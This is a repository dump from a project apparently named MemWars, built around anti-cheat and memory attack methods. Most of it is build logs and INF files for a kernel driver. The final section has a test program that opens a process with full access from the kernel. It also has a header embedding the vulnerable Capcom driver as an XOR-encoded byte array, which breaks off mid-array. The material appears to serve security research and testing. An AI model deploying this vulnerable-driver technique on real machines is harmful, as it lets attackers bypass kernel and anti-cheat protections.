C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\BIN\10.0.17134.0\X86\WINDOWSPROTECTEDFILES.XML
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/inf2cat.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/link.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ
/OUT:"C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS" /VERSION:"10.0" /INCREMENTAL:NO /NOLOGO /WX /SECTION:"INIT,d" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\BUFFEROVERFLOWFASTFAILK.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\NTOSKRNL.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\HAL.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\WMILIB.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\WDF\KMDF\X64\1.15\WDFLDR.LIB" "C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\WDF\KMDF\X64\1.15\WDFDRIVERENTRY.LIB" /NODEFAULTLIB /MANIFEST:NO /DEBUG:FASTLINK /PDB:"C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.PDB" /SUBSYSTEM:NATIVE,"10.00" /Driver /OPT:REF /OPT:ICF /ENTRY:"FxDriverEntry" /RELEASE /IMPLIB:"C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.LIB" /MERGE:"_TEXT=.text;_PAGE=PAGE" /MACHINE:X64 /PROFILE /guard:cf /kernel /IGNORE:4198,4010,4037,4039,4065,4070,4078,4087,4089,4221,4108,4088,4218,4218,4235 /osversion:10.0 /pdbcompress /debugtype:pdata X64\DEBUG\DRIVER.OBJ

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/link.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\BUFFEROVERFLOWFASTFAILK.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\NTOSKRNL.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\HAL.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\10.0.17134.0\KM\X64\WMILIB.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\WDF\KMDF\X64\1.15\WDFLDR.LIB
C:\PROGRAM FILES (X86)\WINDOWS KITS\10\LIB\WDF\KMDF\X64\1.15\WDFDRIVERENTRY.LIB
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\PROGRAM FILES (X86)\MICROSOFT VISUAL STUDIO\2017\PROFESSIONAL\VC\TOOLS\MSVC\14.14.26428\BIN\HOSTX86\X64\VCTIP.EXE

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/link.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\DRIVER.OBJ
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.PDB

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/signtool.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
sign /ph /sha1 "FDEC11EC1C0B694A1D535297FF9386D964820A6A" 
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
sign /ph /sha1 "FDEC11EC1C0B694A1D535297FF9386D964820A6A" 

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/signtool.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\WINDOWS\GLOBALIZATION\SORTING\SORTDEFAULT.NLS
C:\WINDOWS\SYSTEM32\TZRES.DLL
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/signtool.timestamp.1.tlog`:

```tlog
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS|636710606567832270
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT|636710606587832881

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/signtool.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.SYS
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.CAT

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/stampinf.command.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
-d "*" -a "amd64" -v "*" -k "1.15"  -x -f x64\Debug\ObRegisterCallbacksDriver.inf -d "*" -a "amd64" -v "*" -k "1.15"  -x C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/stampinf.read.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegist.0443E933.tlog/stampinf.write.1.tlog`:

```tlog
^C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER.INF
C:\USERS\MARIUS\GIT\MEMWARS\ANTICHEATMETHODS\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\OBREGISTERCALLBACKSDRIVER\X64\DEBUG\OBREGISTERCALLBACKSDRIVER.INF

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegisterCallbacksDriver.inf`:

```inf
;
; ObRegisterCallbacksDriver.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=ObRegisterCallbacksDriver.cat
DriverVer = 08/29/2018,16.3.57.133

[DestinationDirs]
DefaultDestDir = 12
ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
ObRegisterCallbacksDriver.sys  = 1,,
;


;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NTamd64

[Standard.NTamd64]
%ObRegisterCallbacksDriver.DeviceDesc%=ObRegisterCallbacksDriver_Device, Root\ObRegisterCallbacksDriver ; TODO: edit hw-id

[ObRegisterCallbacksDriver_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
ObRegisterCallbacksDriver.sys

;-------------- Service installation
[ObRegisterCallbacksDriver_Device.NT.Services]
AddService = ObRegisterCallbacksDriver,%SPSVCINST_ASSOCSERVICE%, ObRegisterCallbacksDriver_Service_Inst

; -------------- ObRegisterCallbacksDriver driver install sections
[ObRegisterCallbacksDriver_Service_Inst]
DisplayName    = %ObRegisterCallbacksDriver.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\ObRegisterCallbacksDriver.sys

;
;--- ObRegisterCallbacksDriver_Device Coinstaller installation ------
;

[ObRegisterCallbacksDriver_Device.NT.CoInstallers]
AddReg=ObRegisterCallbacksDriver_Device_CoInstaller_AddReg
CopyFiles=ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles

[ObRegisterCallbacksDriver_Device_CoInstaller_AddReg]
;


[ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles]
;


[ObRegisterCallbacksDriver_Device.NT.Wdf]
KmdfService =  ObRegisterCallbacksDriver, ObRegisterCallbacksDriver_wdfsect
[ObRegisterCallbacksDriver_wdfsect]
KmdfLibraryVersion = 1.15

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "ObRegisterCallbacksDriver Installation Disk"
ObRegisterCallbacksDriver.DeviceDesc = "ObRegisterCallbacksDriver Device"
ObRegisterCallbacksDriver.SVCDESC = "ObRegisterCallbacksDriver Service"

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegisterCallbacksDriver.log`:

```log
  Building 'ObRegisterCallbacksDriver' with toolset 'WindowsKernelModeDriver10.0' and the 'Universal' target platform.
  Stamping x64\Debug\ObRegisterCallbacksDriver.inf
  Stamping [Version] section with DriverVer=08/28/2018,15.44.15.508
  driver.c
  ObRegisterCallbacksDriver.vcxproj -> C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver.sys
  Done Adding Additional Store
  Successfully signed: C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver.sys
  
  Driver is a Universal Driver.
  .........................
  Signability test complete.
  
  Errors:
  None
  
  Warnings:
  None
  
  Catalog generation complete.
  C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver\obregistercallbacksdriver.cat
  Done Adding Additional Store
  Successfully signed: C:\Users\marius\git\MemWars\AntiCheatMethods\ObRegisterCallbacksDriver\ObRegisterCallbacksDriver\x64\Debug\ObRegisterCallbacksDriver\obregistercallbacksdriver.cat
  

```

`AntiCheatMethods/ObRegisterCallbacksDriver/x64/Debug/ObRegisterCallbacksDriver/ObRegisterCallbacksDriver.inf`:

```inf
;
; ObRegisterCallbacksDriver.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=Sample ; TODO: edit Class
ClassGuid={78A1C341-4539-11d3-B88D-00C04FAD5171} ; TODO: edit ClassGuid
Provider=%ManufacturerName%
CatalogFile=ObRegisterCallbacksDriver.cat
DriverVer = 08/29/2018,16.3.57.133

[DestinationDirs]
DefaultDestDir = 12
ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles = 11

; ================= Class section =====================

[ClassInstall32]
Addreg=SampleClassReg

[SampleClassReg]
HKR,,,0,%ClassName%
HKR,,Icon,,-5

[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]
ObRegisterCallbacksDriver.sys  = 1,,
;


;*****************************************
; Install Section
;*****************************************

[Manufacturer]
%ManufacturerName%=Standard,NTamd64

[Standard.NTamd64]
%ObRegisterCallbacksDriver.DeviceDesc%=ObRegisterCallbacksDriver_Device, Root\ObRegisterCallbacksDriver ; TODO: edit hw-id

[ObRegisterCallbacksDriver_Device.NT]
CopyFiles=Drivers_Dir

[Drivers_Dir]
ObRegisterCallbacksDriver.sys

;-------------- Service installation
[ObRegisterCallbacksDriver_Device.NT.Services]
AddService = ObRegisterCallbacksDriver,%SPSVCINST_ASSOCSERVICE%, ObRegisterCallbacksDriver_Service_Inst

; -------------- ObRegisterCallbacksDriver driver install sections
[ObRegisterCallbacksDriver_Service_Inst]
DisplayName    = %ObRegisterCallbacksDriver.SVCDESC%
ServiceType    = 1               ; SERVICE_KERNEL_DRIVER
StartType      = 3               ; SERVICE_DEMAND_START
ErrorControl   = 1               ; SERVICE_ERROR_NORMAL
ServiceBinary  = %12%\ObRegisterCallbacksDriver.sys

;
;--- ObRegisterCallbacksDriver_Device Coinstaller installation ------
;

[ObRegisterCallbacksDriver_Device.NT.CoInstallers]
AddReg=ObRegisterCallbacksDriver_Device_CoInstaller_AddReg
CopyFiles=ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles

[ObRegisterCallbacksDriver_Device_CoInstaller_AddReg]
;


[ObRegisterCallbacksDriver_Device_CoInstaller_CopyFiles]
;


[ObRegisterCallbacksDriver_Device.NT.Wdf]
KmdfService =  ObRegisterCallbacksDriver, ObRegisterCallbacksDriver_wdfsect
[ObRegisterCallbacksDriver_wdfsect]
KmdfLibraryVersion = 1.15

[Strings]
SPSVCINST_ASSOCSERVICE= 0x00000002
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName="Samples" ; TODO: edit ClassName
DiskName = "ObRegisterCallbacksDriver Installation Disk"
ObRegisterCallbacksDriver.DeviceDesc = "ObRegisterCallbacksDriver Device"
ObRegisterCallbacksDriver.SVCDESC = "ObRegisterCallbacksDriver Service"

```

`AttackServices/CapcomDriverAttack/CapcomAttackTest.cpp`:

```cpp
#include <windows.h>
#include <iostream>
#include <vector>
#include "OpenProcessAttack.h"
#include "../../Core/MemWarsCore.h"
#include "../../Core/MemWarsServicesCore.h"

using namespace std;

void CapcomAttackTest() {

    system("start /B memoryTestApp.exe");
    HANDLE hProcess = NULL;
    while (hProcess == NULL) {
        hProcess = (HANDLE)GetProcessByName("memoryTestApp.exe");
    }

    vector<DWORD> pids = GetPIDsOfProcess(L"memoryTestApp.exe");
    if (pids.empty()) {
        cout << "CapcomAttackTest() failed. Pids not found" << endl;
        system("taskkill /IM memoryTestApp.exe /F >nul");
        return;
    }
    DWORD pid = pids[0];

    if (OpenProcessFromKernel((HANDLE)pid, PROCESS_ALL_ACCESS) == NULL) {
        cout << "CapcomAttackTest() failed" << endl;
        return;
    } else {
        cout << "CapcomAttackTest() success" << endl;
    }
    
    system("taskkill /IM memoryTestApp.exe /F >nul");
}

int main() {
    CapcomAttackTest();
}
```

`AttackServices/CapcomDriverAttack/CapcomDriver.h`:

```h
#pragma once
static unsigned char CAPCOM_DRIVER[] = 
{
	0xaf, 0xb8, 0x72, 0xe2, 0xe1, 0xe2, 0xe2, 0xe2, 0xe6, 0xe2, 0xe2, 0xe2, 0x1d, 0x1d, 0xe2, 0xe2, 0x5a, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x22, 0xe2, 0xe2, 0xe2, 0xec, 0xfd, 0x58, 0xec, 0xe2, 0x56, 0xeb, 0x2f, 0xc3, 0x5a, 0xe3, 0xae, 0x2f, 0xc3, 0xb6, 0x8a,
	0x8b, 0x91, 0xc2, 0x92, 0x90, 0x8d, 0x85, 0x90, 0x83, 0x8f, 0xc2, 0x81, 0x83, 0x8c, 0x8c, 0x8d, 0x96, 0xc2, 0x80, 0x87, 0xc2, 0x90, 0x97, 0x8c, 0xc2, 0x8b, 0x8c, 0xc2, 0xa6, 0xad, 0xb1, 0xc2, 0x8f, 0x8d, 0x86, 0x87, 0xcc, 0xef, 0xef, 0xe8,
	0xc6, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xf, 0x16, 0xf6, 0x3f, 0x4b, 0x77, 0x98, 0x6c, 0x4b, 0x77, 0x98, 0x6c, 0x4b, 0x77, 0x98, 0x6c, 0x4b, 0x77, 0x99, 0x6c, 0x4c, 0x77, 0x98, 0x6c, 0x3d, 0xea, 0xe3, 0x6c, 0x48, 0x77, 0x98, 0x6c,
	0x3d, 0xea, 0xf6, 0x6c, 0x4a, 0x77, 0x98, 0x6c, 0x3d, 0xea, 0xe0, 0x6c, 0x4a, 0x77, 0x98, 0x6c, 0xb0, 0x8b, 0x81, 0x8a, 0x4b, 0x77, 0x98, 0x6c, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xb2, 0xa7, 0xe2, 0xe2, 0x86, 0x64, 0xe7, 0xe2,
	0xf7, 0xf6, 0x2f, 0xb5, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x12, 0xe2, 0xc0, 0xe2, 0xe9, 0xe0, 0xea, 0xe2, 0x62, 0xe4, 0xe2, 0xe2, 0x62, 0xe0, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xde, 0xe4, 0xe2, 0xe2, 0xe2, 0xe1, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe3, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x62, 0xe2, 0xe2, 0xe2, 0x62, 0xe2, 0xe2, 0xe2, 0xe7, 0xe2, 0xe0, 0xe2, 0xe7, 0xe2, 0xe0, 0xe2, 0xe7, 0xe2, 0xe0, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xee, 0xe2, 0xe2, 0xe2, 0xe1, 0xe2, 0xe2,
	0xf9, 0x8, 0xe2, 0xe2, 0xe3, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe6, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xf2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xf2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xf2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xf2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x62, 0xe8, 0xe2, 0xe2, 0xca, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xeb, 0xe2, 0xe2, 0xaa, 0xe2, 0xe2, 0xe2,
	0xe2, 0xee, 0xe2, 0xe2, 0xb2, 0xff, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa2, 0xe1, 0xe2, 0xe2, 0xfe, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe1, 0xe2, 0xe2, 0xa2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xcc, 0x96, 0x87, 0x9a, 0x96, 0xe2, 0xe2, 0xe2, 0x2, 0xe6, 0xe2, 0xe2, 0xe2, 0xe1, 0xe2, 0xe2, 0xe2, 0xe7, 0xe2, 0xe2, 0xe2, 0xe1, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xc2, 0xe2, 0xe2, 0x8a, 0xcc, 0x86, 0x83, 0x96, 0x83, 0xe2, 0xe2, 0xe2, 0x22, 0xe2, 0xe2, 0xe2, 0xe2, 0xea, 0xe2, 0xe2, 0xe2, 0xe3, 0xe2, 0xe2, 0xe2, 0xea, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa2, 0xe2, 0xe2, 0x2a, 0xcc, 0x92, 0x86, 0x83, 0x96, 0x83, 0xe2, 0xe2, 0xaa, 0xe2, 0xe2, 0xe2, 0xe2, 0xeb, 0xe2, 0xe2, 0x62, 0xe2, 0xe2, 0xe2, 0xe2, 0xeb, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa2, 0xe2, 0xe2, 0xaa, 0xcc, 0x8b, 0x8c, 0x84, 0x8d, 0xe2, 0xe2, 0xe2, 0x42, 0xe2, 0xe2, 0xe2, 0x62, 0xeb, 0xe2, 0xe2, 0xe2, 0xe3, 0xe2, 0xe2, 0x62, 0xeb, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa2, 0xe2, 0xe2, 0x2a, 0xab, 0xac, 0xab, 0xb6, 0xe2, 0xe2, 0xe2, 0xe2, 0xf6, 0xe3, 0xe2, 0xe2, 0x62, 0xe8, 0xe2, 0xe2, 0x62, 0xe3, 0xe2, 0xe2, 0x62, 0xe8, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xc2, 0xe2, 0xe2, 0x0, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
	0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0x18, 0xe8, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xf0, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xc8, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xa2, 0xe9, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2, 0xe2,
